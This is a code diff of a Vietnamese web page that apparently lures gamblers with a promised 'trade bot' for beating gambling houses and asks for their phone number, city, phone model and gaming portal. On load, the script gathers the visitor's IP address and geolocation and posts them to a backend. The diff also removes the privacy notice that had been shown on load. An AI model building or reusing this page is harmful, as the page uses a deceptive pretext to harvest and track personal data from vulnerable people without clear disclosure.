@@ -141,7 +141,6 @@
         </div>
     </div>
 
-    <!-- Hộp thoại nhập thông tin -->
     <div class="modal fade" id="phoneModal" tabindex="-1" aria-labelledby="phoneModalLabel" aria-hidden="true">
         <div class="modal-dialog">
             <div class="modal-content">
@@ -152,19 +151,16 @@
                 <div class="modal-body">
                     <p>Hãy nhập thông tin của bạn để nhận mã OTP kích hoạt bot trade:</p>
                     
-                    <!-- Số điện thoại -->
                     <div class="mb-3">
                         <label for="phoneNumber" class="form-label">Số điện thoại</label>
                         <input type="tel" id="phoneNumber" class="form-control" placeholder="Nhập số điện thoại" required>
                     </div>
 
-                    <!-- Tỉnh/Thành phố -->
                     <div class="mb-3">
                         <label for="cityInput" class="form-label">Nhập Tỉnh/Thành phố</label>
                         <input type="text" class="form-control" id="cityInput" placeholder="Nhập tỉnh/thành phố của bạn" required>
                     </div>
 
-                    <!-- Dòng điện thoại -->
                     <div class="mb-3">
                         <label for="phoneType" class="form-label">Dòng điện thoại bạn đang sử dụng</label>
                         <select class="form-select" id="phoneType" required>
@@ -176,7 +172,6 @@
                         </select>
                     </div>
 
-                    <!-- Cổng game muốn chiến thắng -->
                     <div class="mb-3">
                         <label for="gameSelect" class="form-label">Cổng game bạn muốn chiến thắng</label>
                         <input type="text" id="gameSelect" class="form-control" placeholder="Nhập tên cổng game" required>
@@ -197,59 +192,70 @@
         let userLatitude = null;
         let userLongitude = null;
 
-        // Lấy địa chỉ IP công khai từ ipify và hiển thị lên trang
+        // Lấy địa chỉ IP công khai từ API ipify
         window.onload = function() {
-
-            var privacyModal = new bootstrap.Modal(document.getElementById('privacyModal'));
-            privacyModal.show(); // Hiển thị modal ngay khi trang được tải
-
-            // Lấy IP từ API ipify
             fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 ipAddress = data.ip;
-                document.getElementById('ipAddress').textContent = "Hãy là những người đầu tiên chiến thắng nhà cái";
+                document.getElementById('ipAddress').textContent = "IP của bạn: " + ipAddress;
 
-                // Gửi IP public đến Flask backend
-                fetch('http://localhost:5000/api/save-ip', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ ip_address: ipAddress }),
-                })
-                .then(response => response.json())
-                .then(result => {
-                    console.log(result.message); // In thông báo sau khi IP được lưu
-                })
-                .catch(error => {
-                    console.error('Lỗi khi gửi IP:', error);
-                });
+                // Sử dụng Geolocation API để lấy vị trí người dùng
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            userLatitude = position.coords.latitude;
+                            userLongitude = position.coords.longitude;
+
+                            // Gửi IP và vị trí về server
+                            sendIpAndLocation(ipAddress, userLatitude, userLongitude);
+                        },
+                        function(error) {
+                            if (error.code == error.PERMISSION_DENIED) {
+                                console.log('Người dùng từ chối cung cấp vị trí.');
+                                // Gửi chỉ IP khi người dùng từ chối cung cấp vị trí
+                                sendIpAndLocation(ipAddress);
+                            } else {
+                                console.error('Lỗi khi lấy vị trí:', error);
+                                // Gửi chỉ IP nếu có lỗi xảy ra khi lấy vị trí
+                                sendIpAndLocation(ipAddress);
+                            }
+                        }
+                    );
+                } else {
+                    // Trường hợp trình duyệt không hỗ trợ Geolocation API
+                    console.log('Trình duyệt không hỗ trợ Geolocation API.');
+                    sendIpAndLocation(ipAddress);
+                }
             })
             .catch(error => {
                 console.error('Lỗi khi lấy địa chỉ IP:', error);
             });
-
-            // Sử dụng Geolocation API để lấy vị trí người dùng
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        userLatitude = position.coords.latitude;
-                        userLongitude = position.coords.longitude;
-                        console.log('Vị trí hiện tại:', userLatitude, userLongitude);
-                    },
-                    function(error) {
-                        if (error.code == error.PERMISSION_DENIED) {
-                            console.log('Người dùng từ chối cung cấp vị trí.');
-                        } else {
-                            console.error('Lỗi khi lấy vị trí:', error);
-                        }
-                    }
-                );
-            } else {
-                console.log('Trình duyệt không hỗ trợ Geolocation API.');
-            }
         };
+
+        // Hàm gửi IP và vị trí về server
+        function sendIpAndLocation(ip, latitude = null, longitude = null) {
+            fetch('http://localhost:5000/api/save-ip', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    ip_address: ip,
+                    latitude: latitude,
+                    longitude: longitude,
+                    latitude: latitude,
+                    longitude: longitude
+                }),
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log("Thông tin đã được gửi:", result);
+            })
+            .catch(error => {
+                console.error('Lỗi khi gửi thông tin:', error);
+            });
+        }
 
         // Xử lý khi người dùng nhấn nút "TÔI KHÔNG PHẢI ROBOT"
         document.getElementById('verifyBtn').addEventListener('click', function() {
@@ -266,7 +272,7 @@
 
             // Kiểm tra các giá trị form có hợp lệ
             if (phoneNumber && city && phoneType && gameSelect && ipAddress) {
-                console.log('Thông tin người dùng:', { phoneNumber, city, phoneType, gameSelect, ipAddress, userLatitude, userLongitude });
+                console.log('Thông tin người dùng:', { phoneNumber, city, phoneType, gameSelect, ipAddress });
 
                 // Gửi dữ liệu tới server
                 fetch('http://localhost:5000/api/save-user-info', {
@@ -284,23 +290,16 @@
                         longitude: userLongitude
                     }),
                 })
-                .then(response => {
-                    console.log("Phản hồi HTTP:", response);  // In phản hồi HTTP từ server
-                    if (response.ok) {
-                        return response.json();
-                    } else {
-                        throw new Error('Phản hồi lỗi từ server: ' + response.status);
-                    }
-                })
+                .then(response => response.json())
                 .then(result => {
-                    alert("Cảm ơn bạn đã tham gia dự án của chúng tôi! \n chúng tôi đã gửi bạn vào hàng chờ và cung cấp thông tin cho bạn sớm nhất có thể!! \n Số thứ tự của bạn: " + result.stt);  // Thông báo thành công
+                    alert("Cảm ơn bạn đã tham gia dự án của chúng tôi! Số thứ tự của bạn: " + result.stt);
                 })
                 .catch(error => {
                     console.error('Lỗi khi gửi thông tin:', error);
                     alert('Có lỗi xảy ra khi gửi dữ liệu, vui lòng thử lại sau.');
                 });
             } else {
-                alert("Vui lòng nhập đầy đủ thông tin."); // Thông báo nếu thiếu dữ liệu
+                alert("Vui lòng nhập đầy đủ thông tin.");
             }
         });
     </script>
